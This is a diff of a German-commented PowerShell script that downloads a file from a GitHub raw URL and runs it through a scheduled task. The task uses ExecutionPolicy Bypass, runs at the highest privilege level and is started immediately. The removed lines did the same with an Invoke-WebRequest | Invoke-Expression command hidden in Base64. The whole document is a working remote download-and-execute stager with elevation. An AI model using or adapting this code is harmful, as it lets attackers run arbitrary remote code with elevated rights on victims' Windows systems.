@@ -1,13 +1,13 @@
+# Definiere die URL und den Pfad, wo das Skript gespeichert werden soll
 $scriptUrl = "https://raw.githubusercontent.com/Lorcan84/test/main/calc"
+$localScriptPath = "$env:TEMP\downloaded_script.ps1"
 $taskName = "MeinErhöhterTask"
 
-# PowerShell-Befehl in Base64 kodieren
-$command = "Invoke-WebRequest -Uri '$scriptUrl' -UseBasicParsing | Invoke-Expression"
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-$encodedCommand = [Convert]::ToBase64String($bytes)
+# Lade das Skript herunter und speichere es lokal
+Invoke-WebRequest -Uri $scriptUrl -OutFile $localScriptPath -UseBasicParsing
 
-# Erstelle die geplante Aufgabe
-schtasks /create /tn $taskName /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand" /sc once /st 00:00 /rl highest /f | Out-Null
+# Erstelle die geplante Aufgabe, um das lokale Skript auszuführen
+schtasks /create /tn $taskName /tr "powershell.exe -ExecutionPolicy Bypass -File `"$localScriptPath`"" /sc once /st 00:00 /rl highest /f | Out-Null
 
 # Führe die Aufgabe sofort aus
 schtasks /run /tn $taskName
